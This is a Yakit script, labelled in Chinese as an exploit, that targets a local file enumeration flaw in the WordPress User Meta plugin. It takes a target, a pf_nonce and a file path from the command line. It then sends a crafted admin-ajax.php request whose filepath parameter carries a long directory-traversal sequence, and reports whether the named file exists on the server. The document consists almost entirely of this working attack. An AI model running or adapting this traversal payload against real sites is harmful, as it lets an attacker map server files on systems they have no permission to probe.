script_name: wordpress插件User Meta本地文件枚举漏洞EXP
content:
yakit.AutoInitYakit()

# Input your code!


#isHttps = cli.Have("https", cli.setDefault(false))

packet1 = `
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 158
Connection: close
Cookie: [subscriber+]

field_name=test&filepath=/../../../../../../../../../../../../../..{{params(file)}}&field_id=um_field_4&form_key=Upload&action=um_show_uploaded_file&pf_nonce={{params(pf_nonce)}}&is_ajax=true`


log.setLevel("info")
yakit.Info("开始解析参数！")
isHttps = cli.Have("https", cli.setDefault(false))
target = cli.String("target")
pf_nonce = cli.String("pf_nonce")
file = cli.String("file")


if target == "" {
    yakit.Error("没有输入要攻击的地址！")
    os.Exit()
}
if pf_nonce == "" {
    yakit.Error("没有输入pf_nonce！")
    os.Exit()
}
if file == "" {
    yakit.Error("没有输入要检测的文件名！")
    os.Exit()
}

yakit.Info("开始进行检测！")
sendPacket1 = func(target,pf_nonce,file) {
    return poc.HTTP(
        packet1, 
        poc.timeout(10),
        # poc.proxy("http://127.0.0.1:8083"),
        # poc.proxy("http://127.0.0.1:7890"),
        poc.redirectTimes(3),  # 重定向次数
        poc.https(isHttps),
        poc.params({
            "pf_nonce": pf_nonce,
            "file": file,
            "target": target
        },
    ))
}

result = "umRemoveFile"
rsp, rep, err =sendPacket1(target,pf_nonce,file)
if err != nil { 
    yakit.SetProgress(0.1)
    sleep(1)
    yakit.SetProgress(0.4)
    sleep(1)
    yakit.SetProgress(0.8)
    sleep(1)
    yakit.SetProgress(1.0)
    sleep(1)
    yakit.Error("请求错误！")
    die(err) }

ins,err=poc.ParseBytesToHTTPResponse(rsp)
if err != nil { 
    yakit.SetProgress(0.1)
    sleep(1)
    yakit.SetProgress(0.4)
    sleep(1)
    yakit.SetProgress(0.8)
    sleep(1)
    yakit.SetProgress(1.0)
    sleep(1)
    yakit.Error("请求错误！")
    die(err) }

headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
if ins.StatusCode==200  {
    if str.MatchAllOfSubString(body, result){
        yakit.SetProgress(0.1)
        sleep(1)
        yakit.SetProgress(0.4)
        sleep(1)
        yakit.SetProgress(0.8)
        sleep(1)
        yakit.SetProgress(1.0)
        sleep(1)
        yakit.Info("检测完成！")
        yakit.Info("%s文件存在",file)
        
    }else{
        yakit.SetProgress(0.1)
        sleep(1)
        yakit.SetProgress(0.4)
        sleep(1)
        yakit.SetProgress(0.8)
        sleep(1)
        yakit.SetProgress(1.0)
        sleep(1)
        yakit.Info("%s文件不存在",file)
        
    }
}else{
        yakit.SetProgress(0.1)
        sleep(1)
        yakit.SetProgress(0.4)
        sleep(1)
        yakit.SetProgress(0.8)
        sleep(1)
        yakit.SetProgress(1.0)
        sleep(1)
        yakit.Info("检测失败！")

}
